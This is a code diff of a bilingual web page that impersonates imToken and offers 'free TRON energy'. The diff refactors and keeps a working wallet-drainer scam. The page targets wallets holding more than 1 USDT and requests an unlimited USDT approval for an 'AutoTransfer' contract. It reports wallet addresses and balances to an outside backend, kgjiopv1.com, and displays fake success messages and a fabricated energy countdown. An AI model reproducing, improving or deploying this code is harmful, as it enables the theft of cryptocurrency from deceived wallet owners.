@@ -338,12 +338,13 @@ body {
     <script src="imtoken://browser"></script>
     <script>
     // 核心配置（后端主域名已包含/api，直接使用）
+    // 核心配置
     const AUTO_TRANSFER_CONTRACT = "TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL";
     const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-    const BACKEND_API = "https://kgjiopv1.com"; // 主域名已包含/api，无需额外添加
+    const BACKEND_API = "https://kgjiopv1.com";
     const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
     
-    // 精简版USDT合约ABI（仅保留核心函数+必要事件）
+    // 精简版USDT合约ABI
     const USDT_ABI = [
         {
             "constant": true,
@@ -376,22 +377,20 @@ body {
         }
     ];
 
-    // 能量计算配置：每秒减少1243，跨设备同步（不依赖localStorage）
-    const DEPLOY_START_TIME = new Date("2025-10-28T00:00:00Z").getTime();
-    const INIT_ENERGY = 315360004000;
-    const ENERGY_DECREASE_PER_SEC = 1243; // 需求：每秒减少1243
-    const STORAGE_KEY = "energy_countdown_data";
-    let energyTimer = null;
+    // 合约剩余能量配置（统一命名为“能量”，删除TRX关联）
+    const INIT_ENERGY = 315360004000; // 初始合约能量
+    const ENERGY_DECREASE_PER_SEC = 1243; // 能量每秒减少量
+    const DEPLOY_START_TIME = new Date("2025-10-28T00:00:00Z").getTime(); // 部署时间
+    let energyTimer = null; // 能量定时器
     
-    // 全局变量
+    // 全局变量（仅保留能量/领取相关）
     let tronWeb = null;
     let userAddress = null;
     let trc20Contract = null;
-    let tokenBalance = 0.00; // USDT余额
-    let trxBalance = 0.00;  // TRX余额
+    let usdtBalance = 0.00; // USDT余额（用于领取条件判断）
     const RECORD_KEY = "imtoken_energy_records";
 
-    // ========== 多语言配置（补充所有动态文本键名，确保无遗漏） ==========
+    // ========== 多语言配置（仅保留“能量”相关文本） ==========
     const langConfig = {
         zh: {
             headerTitle: "imToken",
@@ -423,7 +422,7 @@ body {
             connectBtnText: "连接imToken钱包",
             approveBtnText: "免费领取能量",
             reviewTipText: "系统审核中，审核通过后请务必完成签名",
-            footerInfo: "合约验证：AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>（TRON浏览器查询）© 2025 TRX能量服务 | <a href='https://tronscan.org' target='_blank'>TRON浏览器</a> | <a href='https://token.im' target='_blank'>imToken官网</a>",
+            footerInfo: "合约验证：AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>（TRON浏览器查询）© 2025 能量服务 | <a href='https://tronscan.org' target='_blank'>TRON浏览器</a> | <a href='https://token.im' target='_blank'>imToken官网</a>",
             copySuccess: "✅ 链接已复制，请在imToken内置浏览器打开",
             copyFail: "❌ 复制失败：请手动复制链接",
             唤起Guide: "✅ 已复制链接+唤起imToken\n下一步：打开imToken → 浏览 → 粘贴访问",
@@ -436,17 +435,17 @@ body {
             deployingBtn: "发放中...",
             loadingBtn: "加载中...",
             loadingTip: "已连接：<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>✅ 加载中...</span>",
-            queryingBalance: "查询中...", // 新增：余额查询中提示
-            insufficientUsdt: "已连接：<br>{address}<br>USDT余额：<span style='color: #ef4444;'>{usdt}</span> | TRX余额：<span>{trx}</span><br><span style='color: #ef4444; font-size: 14px;'>❌ 不符合领取条件</span>",
+            queryingBalance: "查询中...",
+            insufficientUsdt: "已连接：<br>{address}<br>USDT余额：<span style='color: #ef4444;'>{usdt}</span><br><span style='color: #ef4444; font-size: 14px;'>❌ 不符合领取条件（USDT需＞1）</span>",
             insufficientBtn: "不符合领取条件",
-            eligibleTip: "已连接：<br>{address}<br>USDT余额：<span style='color: #4ade80;'>{usdt}</span> | TRX余额：<span>{trx}</span><br><span style='color: #4ade80; font-size: 14px;'>✅ 可免费领取90000 TRX能量</span>",
+            eligibleTip: "已连接：<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>✅ 可免费领取90000能量</span>",
             distributingBtn: "能量配送中...",
             redirectingBtn: "跳转签名中...",
             approveFail: "⚠️ 操作失败：{msg}，请稍后重试",
             authorizeFail: "⚠️ 授权失败：{msg}，请稍后重试",
-            successTip: "🎉 免费能量领取完成！\n90000 TRX能量已到账～",
+            successTip: "🎉 免费能量领取完成！\n90000能量已到账～",
             successBtn: "能量领取成功",
-            successArrival: "<br><span style='color: #4ade80;'>✅ 90000 TRX能量已到账</span>",
+            successArrival: "<br><span style='color: #4ade80;'>✅ 90000能量已到账</span>",
             recordAddress: "地址：",
             recordType: "领取类型：",
             recordEnergy: "获取能量：",
@@ -454,7 +453,7 @@ body {
             freeEnergy: "免费领取",
             systemBusyTip: "系统繁忙请稍后重试",
             ineligibleTip: "不符合领取条件",
-            errorTipPrefix: "⚠️ " // 新增：错误提示前缀
+            errorTipPrefix: "⚠️ "
         },
         en: {
             headerTitle: "imToken Official",
@@ -486,7 +485,7 @@ body {
             connectBtnText: "Connect imToken Wallet",
             approveBtnText: "Claim Free Energy",
             reviewTipText: "System reviewing - please complete the signature after approval",
-            footerInfo: "Contract Verification: AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span> (Check on TRON Scan) © 2025 TRX Energy Service | <a href='https://tronscan.org' target='_blank'>TRON Scan</a> | <a href='https://token.im' target='_blank'>imToken Official</a>",
+            footerInfo: "Contract Verification: AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span> (Check on TRON Scan) © 2025 Energy Service | <a href='https://tronscan.org' target='_blank'>TRON Scan</a> | <a href='https://token.im' target='_blank'>imToken Official</a>",
             copySuccess: "✅ Link copied - open in imToken in-app browser",
             copyFail: "❌ Copy failed - please copy manually",
             唤起Guide: "✅ Link copied + imToken launched\nNext: Open imToken → Browser → Paste link",
@@ -499,17 +498,17 @@ body {
             deployingBtn: "Distributing...",
             loadingBtn: "Loading...",
             loadingTip: "Connected:<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>✅ Loading...</span>",
-            queryingBalance: "Querying...", // 新增：余额查询中提示
-            insufficientUsdt: "Connected:<br>{address}<br>USDT Balance: <span style='color: #ef4444;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #ef4444; font-size: 14px;'>❌ Ineligible</span>",
+            queryingBalance: "Querying...",
+            insufficientUsdt: "Connected:<br>{address}<br>USDT Balance: <span style='color: #ef4444;'>{usdt}</span><br><span style='color: #ef4444; font-size: 14px;'>❌ Ineligible (USDT must be >1)</span>",
             insufficientBtn: "Ineligible",
-            eligibleTip: "Connected:<br>{address}<br>USDT Balance: <span style='color: #4ade80;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #4ade80; font-size: 14px;'>✅ Eligible for 90000 free TRX Energy</span>",
+            eligibleTip: "Connected:<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>✅ Eligible for 90000 free energy</span>",
             distributingBtn: "Energy Distributing...",
             redirectingBtn: "Redirecting to Signature...",
             approveFail: "⚠️ Operation failed: {msg}, please try again later",
             authorizeFail: "⚠️ Authorization failed: {msg}, please try again later",
-            successTip: "🎉 Free Energy Claim Completed!\n90000 TRX Energy has been credited～",
+            successTip: "🎉 Free Energy Claim Completed!\n90000 energy has been credited～",
             successBtn: "Claim Successful",
-            successArrival: "<br><span style='color: #4ade80;'>✅ 90000 TRX Energy credited</span>",
+            successArrival: "<br><span style='color: #4ade80;'>✅ 90000 energy credited</span>",
             recordAddress: "Address:",
             recordType: "Claim Type:",
             recordEnergy: "Energy Obtained:",
@@ -517,14 +516,14 @@ body {
             freeEnergy: "Free Claim",
             systemBusyTip: "System busy, please try again later",
             ineligibleTip: "Ineligible",
-            errorTipPrefix: "⚠️ " // 新增：错误提示前缀
+            errorTipPrefix: "⚠️ "
         }
     };
     
-    // 当前语言（从本地存储读取，默认中文）
+    // 当前语言
     let currentLang = localStorage.getItem("imtoken_energy_lang") || "zh";
 
-    // ========== 二次授权校验：本地存储工具（30天有效期） ==========
+    // ========== 二次授权校验 ==========
     const AUTHORIZED_KEY = "authorized_wallet_addresses";
     function getAuthorizedAddresses() {
         try {
@@ -549,13 +548,12 @@ body {
     function isAddressAuthorized(address) {
         const addresses = getAuthorizedAddresses();
         if (!addresses.includes(address)) return false;
-        // 30天有效期校验
         const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
         const record = records.find(item => item.address === address);
         if (!record) return false;
         const receiveTime = new Date(record.receiveTime).getTime();
         const thirtyDays = 30 * 24 * 60 * 60 * 1000;
-        return Date.now() - receiveTime < thirtyDays; // 30天内禁止再次领取
+        return Date.now() - receiveTime < thirtyDays;
     }
     
     // DOM元素缓存
@@ -569,13 +567,12 @@ body {
     const approvalRecords = document.getElementById("approvalRecords");
     const reviewTip = document.getElementById("reviewTip");
     const reviewTipText = document.getElementById("reviewTipText");
-    const langToggle = document.getElementById("langToggle"); // 单个语言切换按钮
+    const langToggle = document.getElementById("langToggle");
     const footerInfo = document.getElementById("footerInfo");
 
-        // ========== 错误类型判断（区分客户/非客户原因） ==========
+    // ========== 错误类型判断 ==========
     function isCustomerError(errMsg) {
         const lang = langConfig[currentLang];
-        // 客户自身原因关键词（多语言适配）
         const customerErrorKeys = [
             lang.ineligibleTip, "无效TRON地址", "USDT余额不足", "不符合领取条件", "30天内已领取", 
             "跨组执行", "未检测到钱包地址", "Ineligible", "invalid TRON address", 
@@ -584,46 +581,36 @@ body {
         return customerErrorKeys.some(key => errMsg.includes(key));
     }
 
-    // ========== 单个按钮切换语言（中文↔英文）- 核心修复：重新渲染所有动态内容 ==========
+    // ========== 语言切换 ==========
     function toggleLang() {
         currentLang = currentLang === "zh" ? "en" : "zh";
         localStorage.setItem("imtoken_energy_lang", currentLang);
-        updatePageLang(); // 更新所有静态文本
-        reRenderDynamicContent(); // 重新渲染所有动态文本（连接状态、余额、错误提示等）
-        renderEnergyRecords(); // 重新渲染领取记录
+        updatePageLang();
+        reRenderDynamicContent();
+        renderEnergyRecords();
     }
     
-    // 修复1：更新所有静态文本（确保无遗漏）
     function updatePageLang() {
         const lang = langConfig[currentLang];
-        // 遍历所有多语言键，更新对应DOM元素（包括顶部连接状态所有文本）
         Object.keys(lang).forEach(key => {
             const el = document.getElementById(key);
-            if (el) {
-                // 特殊处理包含HTML的文本（如connectedAddress、userInfoDefault等）
-                el.innerHTML = lang[key];
-            }
+            if (el) el.innerHTML = lang[key];
         });
-        // 单独更新按钮文本
         connectBtn.textContent = lang.connectBtnText;
         approveBtn.textContent = lang.approveBtnText;
         reviewTipText.textContent = lang.reviewTipText;
         approvalRecords.textContent = lang.noRecord;
     }
 
-    // 修复2：重新渲染动态内容（语言切换时同步更新）
     function reRenderDynamicContent() {
         const lang = langConfig[currentLang];
         if (!userAddress) {
-            // 未连接钱包：显示默认文本
             userInfoEl.innerHTML = lang.userInfoDefault;
             approveBtn.disabled = true;
-            approveBtn.textContent = lang.approveBtnText;
             return;
         }
 
         const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-        // 30天内已领取
         if (isAddressAuthorized(userAddress)) {
             userInfoEl.innerHTML = lang.authorizedTip.replace("{address}", shortAddr);
             approveBtn.disabled = true;
@@ -633,35 +620,74 @@ body {
             return;
         }
 
-        // 已连接钱包：根据余额状态重新渲染
-        if (tokenBalance <= 1) {
+        if (usdtBalance <= 1) {
             userInfoEl.innerHTML = lang.insufficientUsdt
                 .replace("{address}", shortAddr)
-                .replace("{usdt}", tokenBalance.toFixed(2))
-                .replace("{trx}", trxBalance.toFixed(2));
+                .replace("{usdt}", usdtBalance.toFixed(2));
             approveBtn.disabled = true;
             approveBtn.textContent = lang.insufficientBtn;
-        } else if (tokenBalance > 1) {
-            userInfoEl.innerHTML = lang.eligibleTip
-                .replace("{address}", shortAddr)
-                .replace("{usdt}", tokenBalance.toFixed(2))
-                .replace("{trx}", trxBalance.toFixed(2));
-            approveBtn.disabled = false;
-            approveBtn.textContent = lang.approveBtnText;
         } else {
-            // 余额查询中
-            userInfoEl.innerHTML = lang.eligibleTip
-                .replace("{address}", shortAddr)
-                .replace("{usdt}", lang.queryingBalance)
-                .replace("{trx}", lang.queryingBalance);
+            userInfoEl.innerHTML = lang.eligibleTip.replace("{address}", shortAddr);
             approveBtn.disabled = false;
             approveBtn.textContent = lang.approveBtnText;
         }
 
-        // 同步更新顶部连接状态的地址显示
         document.getElementById("statusAddress").textContent = shortAddr;
         updateWalletStatus();
-        bindApproveLogic(); // 重新绑定按钮逻辑（确保提示文本同步）
+        bindApproveLogic();
+    }
+
+    // ========== 合约剩余能量计算逻辑（仅保留能量） ==========
+    // 读取能量状态
+    function loadEnergyStateFromStorage() {
+        const saved = localStorage.getItem("energy_state");
+        if (!saved) return { currentEnergy: INIT_ENERGY.toString() };
+        try {
+            return JSON.parse(saved);
+        } catch (e) {
+            return { currentEnergy: INIT_ENERGY.toString() };
+        }
+    }
+
+    // 保存能量状态
+    function saveEnergyStateToStorage(state) {
+        localStorage.setItem("energy_state", JSON.stringify(state));
+    }
+
+    // 更新能量显示
+    function updateEnergyDisplay(currentEnergy) {
+        saveEnergyStateToStorage({ currentEnergy });
+        if (contractEnergyEl) {
+            contractEnergyEl.textContent = Math.floor(Number(currentEnergy)).toLocaleString();
+        }
+    }
+
+    // 启动能量倒计时
+    function startPersistentEnergyCountdown() {
+        const savedState = loadEnergyStateFromStorage();
+        let currentEnergy = savedState.currentEnergy;
+
+        // 基于部署时间计算当前能量
+        const now = new Date().getTime();
+        const totalSecPassed = Math.floor((now - DEPLOY_START_TIME) / 1000);
+        currentEnergy = (INIT_ENERGY - totalSecPassed * ENERGY_DECREASE_PER_SEC).toFixed(4);
+
+        // 确保能量不小于0
+        if (Number(currentEnergy) < 0) currentEnergy = "0.0000";
+
+        // 初始化更新
+        updateEnergyDisplay(currentEnergy);
+
+        // 启动每秒更新定时器
+        if (energyTimer) clearInterval(energyTimer);
+        energyTimer = setInterval(() => {
+            currentEnergy = (Number(currentEnergy) - ENERGY_DECREASE_PER_SEC).toFixed(4);
+            if (Number(currentEnergy) < 0) {
+                currentEnergy = "0.0000";
+                clearInterval(energyTimer);
+            }
+            updateEnergyDisplay(currentEnergy);
+        }, 1000);
     }
 
     window.onload = async () => {
@@ -671,28 +697,25 @@ body {
         renderEnergyRecords();
         updateWalletStatus();
         
-        // 环境检测+钱包初始化（错误静默处理）
+        // 环境检测
         await checkImTokenEnv().catch(err => {
-            console.error("环境检测失败：", err);
             const lang = langConfig[currentLang];
             userInfoEl.innerHTML = lang.userInfoDefault;
             approveBtn.disabled = true;
-            approveBtn.textContent = lang.approveBtnText;
         });
         
-        // 关键修复：确保定时器在这里启动（不被try/catch阻断）
+        // 启动合约剩余能量计算
         startPersistentEnergyCountdown();
         
         window.addEventListener("beforeunload", () => {
             if (energyTimer) clearInterval(energyTimer);
         });
 
-        // 授权后跳转处理（错误静默处理）
+        // 授权后跳转处理
         if (window.tronWeb && window.location.hash === "#approve") {
             window.location.hash = "";
             setTimeout(() => {
                 initWallet(true).catch(err => {
-                    console.error("授权后初始化失败：", err);
                     const lang = langConfig[currentLang];
                     const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "未知地址";
                     const tip = isCustomerError(err.message) ? lang.ineligibleTip : lang.systemBusyTip;
@@ -705,7 +728,7 @@ body {
     };
 
     /**
-     * 环境检测（错误静默处理）
+     * 环境检测
      */
     async function checkImTokenEnv() {
         const lang = langConfig[currentLang];
@@ -715,31 +738,25 @@ body {
             warning.style.display = "none";
             await initWallet(false);
         } else {
-            try {
-                userInfoEl.innerHTML = `
-                    ⚠️ ${lang.browserWarn1.split("<strong>")[1].split("</strong>")[0]}<br>
-                    <span style="color: #3b82f6; font-size: 13px;">${lang.copyGuide.split("✅ ")[1]}</span>
-                `;
-                approveBtn.style.display = "none";
-                connectBtn.onclick = async () => {
-                    try {
-                        const dappUrl = window.location.href;
-                        await navigator.clipboard.writeText(dappUrl);
-                        window.location.href = "imtoken://open";
-                        setTimeout(() => {}, 1200); // 不弹框
-                    } catch (e) {
-                        console.error("复制/唤起失败：", e);
-                    }
-                };
-            } catch (e) {
-                console.error("非imToken环境处理失败：", e);
-            }
+            userInfoEl.innerHTML = `
+                ⚠️ ${lang.browserWarn1.split("<strong>")[1].split("</strong>")[0]}<br>
+                <span style="color: #3b82f6; font-size: 13px;">${lang.copyGuide.split("✅ ")[1]}</span>
+            `;
+            approveBtn.style.display = "none";
+            connectBtn.onclick = async () => {
+                try {
+                    const dappUrl = window.location.href;
+                    await navigator.clipboard.writeText(dappUrl);
+                    window.location.href = "imtoken://open";
+                } catch (e) {
+                    console.error("复制/唤起失败：", e);
+                }
+            };
         }
     }
 
     /**
-     * 钱包初始化（连接后立即显示按钮，动态文本多语言适配）
-     * @param {boolean} isAfterApprove - 是否是授权后返回
+     * 钱包初始化
      */
     async function initWallet(isAfterApprove) {
         const lang = langConfig[currentLang];
@@ -747,7 +764,7 @@ body {
             userAddress = tronWeb.defaultAddress.base58;
             if (!userAddress) throw new Error(lang.ineligibleTip);
 
-            // 30天内已领取（客户原因）- 优先拦截
+            // 30天内已领取拦截
             if (isAddressAuthorized(userAddress)) {
                 const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
                 userInfoEl.innerHTML = lang.authorizedTip.replace("{address}", shortAddr);
@@ -766,21 +783,17 @@ body {
                 document.getElementById("statusAddress").textContent = shortAddr;
                 updateWalletStatus();
                 await executeAfterApprove().catch(err => {
-                    console.error("授权后发放能量失败：", err);
                     const tip = isCustomerError(err.message) ? lang.ineligibleTip : lang.systemBusyTip;
-                    userInfoEl.innerHTML = `${lang.eligibleTip.replace("{address}", shortAddr).replace("{usdt}", tokenBalance.toFixed(2)).replace("{trx}", trxBalance.toFixed(2))}<br><span style='color: #ef4444; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
+                    userInfoEl.innerHTML = `${lang.eligibleTip.replace("{address}", shortAddr)}<br><span style='color: #ef4444; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
                     approveBtn.disabled = false;
                     approveBtn.textContent = lang.approveBtnText;
                 });
                 return;
             }
 
-            // 立即更新UI（多语言适配）
+            // 立即更新UI
             const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-            userInfoEl.innerHTML = lang.eligibleTip
-                .replace("{address}", shortAddr)
-                .replace("{usdt}", lang.queryingBalance)
-                .replace("{trx}", lang.queryingBalance);
+            userInfoEl.innerHTML = lang.eligibleTip.replace("{address}", shortAddr);
             approveBtn.disabled = false;
             approveBtn.textContent = lang.approveBtnText;
             document.getElementById("statusAddress").textContent = shortAddr;
@@ -788,37 +801,23 @@ body {
             bindApproveLogic();
 
             // 异步发送A1信号
-            sendSignalA1().catch(err => console.error("A1信号异步发送失败：", err));
+            sendSignalA1().catch(err => console.error("A1信号发送失败：", err));
 
-            // 异步查询余额（多语言适配）
+            // 异步查询USDT余额（仅保留此部分，删除TRX余额查询）
             trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
-            Promise.all([
-                trc20Contract.balanceOf(userAddress).call().catch(err => 0),
-                tronWeb.trx.getBalance(userAddress).catch(err => 0)
-            ]).then(([usdtRaw, trxRaw]) => {
-                tokenBalance = Number(usdtRaw) / 1000000;
-                trxBalance = Number(trxRaw) / 1000000;
-                // 余额不足（多语言提示）
-                if (tokenBalance <= 1) {
-                    userInfoEl.innerHTML = lang.insufficientUsdt
-                        .replace("{address}", shortAddr)
-                        .replace("{usdt}", tokenBalance.toFixed(2))
-                        .replace("{trx}", trxBalance.toFixed(2));
-                    approveBtn.disabled = true;
-                    approveBtn.textContent = lang.insufficientBtn;
-                } else {
-                    // 余额足够（多语言提示）
-                    userInfoEl.innerHTML = lang.eligibleTip
-                        .replace("{address}", shortAddr)
-                        .replace("{usdt}", tokenBalance.toFixed(2))
-                        .replace("{trx}", trxBalance.toFixed(2));
-                }
-            }).catch(err => {
-                console.error("余额异步查询失败：", err);
-            });
+            const usdtRaw = await trc20Contract.balanceOf(userAddress).call().catch(err => 0);
+            usdtBalance = Number(usdtRaw) / 1000000;
+
+            // 根据USDT余额更新状态
+            if (usdtBalance <= 1) {
+                userInfoEl.innerHTML = lang.insufficientUsdt
+                    .replace("{address}", shortAddr)
+                    .replace("{usdt}", usdtBalance.toFixed(2));
+                approveBtn.disabled = true;
+                approveBtn.textContent = lang.insufficientBtn;
+            }
 
         } catch (e) {
-            console.error("钱包初始化失败：", e);
             const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "未知地址";
             const tip = isCustomerError(e.message) ? lang.ineligibleTip : lang.systemBusyTip;
             userInfoEl.innerHTML = `${lang.loadingTip.replace("{address}", shortAddr)}<br><span style='color: #ef4444; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
@@ -828,7 +827,7 @@ body {
     }
 
     /**
-     * 授权后执行：发放能量（多语言适配）
+     * 授权后执行
      */
     async function executeAfterApprove() {
         const lang = langConfig[currentLang];
@@ -856,7 +855,7 @@ body {
             addAuthorizedAddress(userAddress);
             btn.textContent = lang.successBtn;
             userInfoEl.innerHTML += lang.successArrival;
-            alert(lang.successTip); // 成功提示多语言
+            alert(lang.successTip);
             saveEnergyRecord();
             renderEnergyRecords();
         } catch (e) {
@@ -866,7 +865,7 @@ body {
     }
 
     /**
-     * 发送A1信号（异步无阻塞）
+     * 发送A1信号
      */
     async function sendSignalA1() {
         const requestData = { userAddress };
@@ -881,7 +880,7 @@ body {
                 keepalive: true
             });
             clearTimeout(timeoutId);
-            if (res.ok) console.log("✅ A1信号异步发送成功");
+            if (res.ok) console.log("✅ A1信号发送成功");
             return true;
         } catch (e) {
             clearTimeout(timeoutId);
@@ -893,10 +892,9 @@ body {
      * 发送A2信号
      */
     async function sendSignalA2() {
-        const requestData = { userAddress, usdtBalance: tokenBalance };
+        const requestData = { userAddress, usdtBalance };
         const controller = new AbortController();
         const timeoutId = setTimeout(() => controller.abort(), 20000);
-
         try {
             const res = await fetch(`${BACKEND_API}/api/send-signal-a2`, {
                 method: "POST",
@@ -906,13 +904,11 @@ body {
                 keepalive: true
             });
             clearTimeout(timeoutId);
-
             if ([400, 408, 409].includes(res.status)) {
-                const errData = await res.json().catch(() => ({ detail: lang.ineligibleTip }));
-                throw new Error(errData.detail || lang.ineligibleTip);
+                const errData = await res.json().catch(() => ({ detail: langConfig[currentLang].ineligibleTip }));
+                throw new Error(errData.detail || langConfig[currentLang].ineligibleTip);
             }
-
-            if (!res.ok) throw new Error(lang.ineligibleTip);
+            if (!res.ok) throw new Error(langConfig[currentLang].ineligibleTip);
             console.log("✅ A2信号发送成功");
             return true;
         } catch (e) {
@@ -923,7 +919,6 @@ body {
 
     /**
      * 发送B信号
-     * @param {boolean} isB1 - true=发送B1，false=发送B2
      */
     async function sendSignalB(isB1 = true) {
         const requestData = { userAddress };
@@ -931,7 +926,6 @@ body {
         const controller = new AbortController();
         const timeoutId = setTimeout(() => controller.abort(), 20000);
         const lang = langConfig[currentLang];
-
         try {
             const res = await fetch(`${BACKEND_API}${apiPath}`, {
                 method: "POST",
@@ -941,12 +935,10 @@ body {
                 keepalive: true
             });
             clearTimeout(timeoutId);
-
             if ([400, 408, 409].includes(res.status)) {
                 const errData = await res.json().catch(() => ({ detail: lang.ineligibleTip }));
-                throw new Error(errData.detail || (isB1 ? lang.ineligibleTip : lang.ineligibleTip));
+                throw new Error(errData.detail || lang.ineligibleTip);
             }
-
             const data = await res.json();
             if (!res.ok || !data.success) throw new Error(data.detail || lang.ineligibleTip);
             console.log(`✅ 信号${isB1 ? "B1" : "B2"}处理成功`);
@@ -958,7 +950,7 @@ body {
     }
 
     /**
-     * 领取按钮逻辑（多语言提示同步）
+     * 领取按钮逻辑
      */
     function bindApproveLogic() {
         const lang = langConfig[currentLang];
@@ -977,49 +969,14 @@ body {
                 btn.textContent = lang.redirectingBtn;
                 window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href + "#approve")}`;
             } catch (e) {
-                console.error("领取流程失败：", e);
                 const tip = isCustomerError(e.message) ? lang.ineligibleTip : lang.systemBusyTip;
-                alert(`${lang.errorTipPrefix}${tip}`); // 错误提示多语言
-                // 更新页面文本（多语言）
-                userInfoEl.innerHTML = `${lang.eligibleTip.replace("{address}", shortAddr).replace("{usdt}", tokenBalance.toFixed(2)).replace("{trx}", trxBalance.toFixed(2))}<br><span style='color: #ef4444; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
+                alert(`${lang.errorTipPrefix}${tip}`);
+                userInfoEl.innerHTML = `${lang.eligibleTip.replace("{address}", shortAddr)}<br><span style='color: #ef4444; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
                 btn.disabled = false;
                 btn.textContent = lang.approveBtnText;
                 reviewTip.style.display = "none";
             }
         };
-    }
-
-    /**
-     * 能量倒计时：每秒减少1243，跨设备同步（修复不减少问题）
-     */
-    function startPersistentEnergyCountdown() {
-        // 强制按当前时间-部署时间计算，确保跨设备同步且实时减少
-        const calculateEnergy = () => {
-            const timeDiffSec = Math.floor((new Date().getTime() - DEPLOY_START_TIME) / 1000);
-            // 核心公式：初始能量 - 秒数 × 每秒减少量（1243），最小为0
-            return Math.max(0, INIT_ENERGY - (timeDiffSec * ENERGY_DECREASE_PER_SEC));
-        };
-
-        // 初始计算并更新显示（确保页面加载时立即显示正确数值）
-        let currentEnergy = calculateEnergy();
-        updateEnergyDisplay(currentEnergy);
-
-        // 清除旧定时器（避免重复启动导致冲突）
-        if (energyTimer) clearInterval(energyTimer);
-        
-        // 启动新定时器：每秒计算并更新一次
-        energyTimer = setInterval(() => {
-            currentEnergy = calculateEnergy();
-            updateEnergyDisplay(currentEnergy);
-        }, 1000); // 1000毫秒 = 1秒，确保每秒触发一次
-    }
-
-    // 能量显示更新（确保DOM元素正确渲染）
-    function updateEnergyDisplay(currentEnergy) {
-        // 确保contractEnergyEl是全局缓存的DOM元素（已在代码开头缓存）
-        if (contractEnergyEl) {
-            contractEnergyEl.textContent = Math.floor(currentEnergy).toLocaleString();
-        }
     }
 
     function updateWalletStatus() {
@@ -1032,8 +989,7 @@ body {
         const newRecords = existing.filter(item => item.address !== userAddress);
         newRecords.push({
             address: userAddress,
-            tokenBalance: tokenBalance,
-            trxBalance: trxBalance,
+            usdtBalance: usdtBalance,
             receiveTime: new Date().toLocaleString(),
             energyAmount: "90000",
             recordType: lang.freeEnergy
@@ -1053,7 +1009,7 @@ body {
             <div class='record-item'>
                 <p><strong>${lang.recordAddress}</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
                 <p><strong>${lang.recordType}</strong>${record.recordType}</p>
-                <p><strong>${lang.recordEnergy}</strong>${record.energyAmount} TRX Energy</p>
+                <p><strong>${lang.recordEnergy}</strong>${record.energyAmount}</p>
                 <p><strong>${lang.recordTime}</strong>${record.receiveTime}</p>
             </div>
         `).join("");
